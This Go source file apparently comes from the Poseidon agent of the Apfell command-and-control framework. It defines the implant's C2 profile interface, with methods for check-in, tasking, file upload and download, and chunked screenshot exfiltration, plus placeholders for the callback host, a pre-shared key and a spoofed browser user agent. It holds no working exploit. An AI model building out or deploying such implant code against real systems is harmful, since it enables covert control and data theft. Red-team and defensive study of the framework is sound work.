package profiles

import (
	"crypto/rsa"
	"math/rand"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var (
	UUID                         = "UUID"
	ExchangeKeyString            = "T"
	AesPSK                       = "AESPSK"
	BaseURL                      = "http(s)://callbackhost:callbackport"
	UserAgent                    = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3" // Change this value
	Sleep                        = 10
	HostHeader                   = "" // Use an empty string if it's not being used
	seededRand        *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
)

//Profile - Primary interface for apfell C2 profiles
type Profile interface {
	// CheckIn method for sending the initial checkin to the server
	CheckIn(ip string, pid int, user string, host string) interface{}
	// GetTasking method for retrieving the next task from apfell
	GetTasking() interface{}
	// Post a task response to the server
	PostResponse(task structs.Task, output string) []byte
	// Start EKE key negotiation for encrypted comms
	NegotiateKey() string
	// C2 profile implementation for downloading files
	Download(task structs.Task, params string)
	// C2 profile implementation for uploading files
	Upload(task structs.Task, fileid int) []byte
	// C2 profile implementation for sending file downloads or screenshots in chunks
	SendFileChunks(task structs.Task, fileData []byte)
	// C2 profile implementation to generate a unique session ID
	GenerateSessionID() string

	Header() string
	SetHeader(hostname string)
	URL() string
	SetURL(url string)
	SleepInterval() int
	SetSleepInterval(interval int)
	C2Commands() []string
	SetC2Commands(commands []string)
	XKeys() bool
	SetXKeys(exchangingkeys bool)
	SetUserAgent(ua string)
	GetUserAgent() string
	ApfID() int
	SetApfellID(newID int)
	UniqueID() string
	SetUniqueID(newUUID string)
	AesPreSharedKey() string
	SetAesPreSharedKey(newkey string)
	RsaKey() *rsa.PrivateKey
	SetRsaKey(newKey *rsa.PrivateKey)
}
